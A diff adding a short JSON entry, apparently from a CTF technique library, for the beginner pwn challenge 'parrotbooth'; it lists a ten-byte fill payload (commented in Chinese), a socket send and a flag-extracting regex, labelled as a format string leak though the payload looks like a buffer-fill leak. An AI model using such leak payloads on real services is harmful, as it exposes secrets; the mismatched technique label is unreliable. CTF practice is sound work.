@@ -1,0 +1,11 @@
+{
+  "name": "NCO26-Quals-PWN-入门-parrotbooth",
+  "category": "pwn",
+  "technique": "format string leak",
+  "when_to_use": "challenge looks like pwn; recall from writeup 'NCO26-Quals-PWN-入门-parrotbooth'",
+  "commands": [
+    "payload = b\"A\" * 10 + b\"\\n\"   # 占满 line[0..9]，line[10] 即 flag[0]",
+    "s.sendall(payload)",
+    "m = re.search(rb\"NCO26\\{[^}\\r\\n]*\\}\", out)"
+  ]
+}
